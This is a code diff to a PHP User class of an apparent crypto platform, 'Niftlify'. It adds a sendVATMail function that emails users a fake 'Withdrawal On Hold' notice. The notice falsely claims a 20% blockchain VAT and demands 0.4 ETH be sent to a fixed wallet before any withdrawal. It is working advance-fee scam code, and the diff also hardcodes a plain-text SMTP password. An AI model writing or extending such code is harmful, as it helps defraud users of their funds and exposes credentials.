@@ -742,7 +742,7 @@ class User
     $buyCount = $stmtBuy->fetch(PDO::FETCH_OBJ)->buy_count;
 
     // Check if either count is at least 10
-    return $mintCount >= 10 || $buyCount >= 10;
+    return $mintCount >= 7 || $buyCount >= 7;
   }
 
   // fullVerification
@@ -5460,6 +5460,158 @@ class User
       return true;
     } else {
       echo 'Mailer Error: ' . $mail->ErrorInfo;
+    }
+  }
+
+  public function sendVATMail($name, $email)
+  {
+    $message = '
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Withdrawal On Hold - VAT Notification</title>
+        <style>
+          /* Reset CSS for email compatibility */
+          body, table, td, a {
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0;
+            font-family: Arial, sans-serif;
+          }
+          table {
+            border-collapse: collapse;
+            mso-table-lspace: 0pt;
+            mso-table-rspace: 0pt;
+          }
+          img {
+            border: 0;
+            height: auto;
+            line-height: 100%;
+            outline: none;
+            text-decoration: none;
+            -ms-interpolation-mode: bicubic;
+          }
+          /* General styles */
+          body {
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+          }
+          .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+          }
+          .header {
+            background-color: #1a73e8;
+            color: #ffffff;
+            text-align: center;
+            padding: 20px;
+          }
+          .header h1 {
+            font-size: 24px;
+            margin: 0;
+          }
+          .content {
+            padding: 20px;
+            color: #333333;
+            line-height: 1.6;
+          }
+          .content h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+          }
+          .content p {
+            font-size: 16px;
+            margin-bottom: 15px;
+          }
+          .content .highlight {
+            color: #1a73e8;
+            font-weight: bold;
+          }
+          .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #777777;
+            background-color: #f4f4f4;
+          }
+          .button {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: #ffffff;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 20px;
+          }
+          .button:hover {
+            background-color: #1557b0;
+          }
+        </style>
+      </head>
+      <body>
+        <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td>
+              <div class="email-container">
+                <!-- Header -->
+                <div class="header">
+                  <h1 style="text-align: center">Withdrawal On Hold</h1>
+                </div>
+                <!-- Content -->
+                <div class="content">
+                  <h2>Dear ' . $name . ',</h2>
+                  <p>We regret to inform you that your current withdrawal is on hold due to <span class="highlight">VAT (Value Added Tax)</span> on the blockchain. This is because you have crossed <span class="highlight">$2000</span> in transactions.</p>
+                  <p>A <span class="highlight">20% tax</span> is required to proceed with your withdrawal. The blockchain has calculated this tax as <span class="highlight">0.4 ETH</span>.</p>
+                  <p>To complete the process, please send the tax amount to the following address:</p>
+                  <p><strong>0x755912067aF4a45247dBc97cAD1643d0586D6361</strong></p>
+                  <p>Once the tax payment is confirmed, your withdrawal amount will be sent to your wallet address immediately.</p>
+                  <p>If you have any questions or need assistance, please feel free to contact niftlify support team.</p>
+                </div>
+                <!-- Footer -->
+                <div class="footer">
+                  <p>Thank you for using our services.</p>
+                </div>
+              </div>
+            </td>
+          </tr>
+        </table>
+      </body>
+      </html>
+    ';
+
+    $mail  = new PHPMailer\PHPMailer\PHPMailer(true);
+    $bname = "Niftlify";
+
+    $mail->isSMTP();
+    $mail->Host = "smtp.hostinger.com";
+    $mail->SMTPAuth = true;
+    $mail->Username = "support@niftlify.com";
+    $mail->Password = 'lwsK7|Or';
+    $mail->SMTPSecure = "ssl";
+    $mail->Port = 465;
+
+    $mail->setFrom("support@niftlify.com", $bname);
+    $mail->addAddress($email);
+    $mail->isHTML(true);
+
+    $mail->Subject = "Withdrawal On Hold - VAT Notification";
+    $mail->Body = $message;
+
+    if ($mail->send()) {
+      return true;
+    } else {
+      echo 'Mailer Error: ' . $mail->ErrorInfo;
+      return false;
     }
   }
 
